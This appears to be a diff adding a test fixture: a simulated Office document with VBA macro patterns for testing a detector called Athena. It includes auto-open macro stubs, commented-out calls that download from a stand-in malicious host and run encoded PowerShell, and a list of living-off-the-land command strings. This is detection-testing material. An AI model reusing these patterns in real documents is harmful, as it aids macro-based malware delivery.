@@ -1,0 +1,61 @@
+Document: Test Macro Patterns for Security Analysis
+Type: Simulated Office Document with Macro Indicators
+
+[METADATA]
+Author: Test Security Researcher
+Created: 2025-01-06
+Contains Macros: Yes (Simulated)
+
+[VBA MACRO PATTERNS - SAFE SIMULATION]
+
+Sub AutoOpen()
+    ' This simulates an auto-executing macro
+    Call ExecuteTest
+End Sub
+
+Sub Document_Open()
+    ' Alternative auto-execution method
+    Call ExecuteTest
+End Sub
+
+Sub ExecuteTest()
+    ' Suspicious Shell execution pattern
+    Dim objShell As Object
+    Set objShell = CreateObject("WScript.Shell")
+    ' objShell.Run "cmd.exe /c echo test", 0, False
+    
+    ' File system operations
+    Dim fso As Object
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    
+    ' Network download simulation
+    Dim http As Object
+    Set http = CreateObject("MSXML2.XMLHTTP")
+    ' http.Open "GET", "http://malicious.example.com/payload", False
+    
+    ' Registry manipulation
+    ' objShell.RegWrite "HKCU\Software\Test\", "TestValue"
+    
+    ' Process creation
+    ' CreateObject("WScript.Shell").Exec "powershell.exe -enc U2FmZVRlc3Q="
+End Sub
+
+[EMBEDDED OBJECTS]
+- Simulated OLE Object: Flash.ocx
+- Simulated Package: update.exe
+- Simulated Equation Editor Object
+
+[SUSPICIOUS STRINGS]
+- powershell -ExecutionPolicy Bypass
+- cmd /c start
+- cscript //B
+- wscript.exe
+- mshta.exe
+- regsvr32.exe /s /n /u /i:
+
+[EXTERNAL REFERENCES]
+- http://suspicious-domain.example.com/doc.dotm
+- \\192.168.1.100\share\template.dot
+- file:///C:/Users/Public/malware.exe
+
+Note: This is a text representation of macro patterns for testing Athena's detection capabilities.
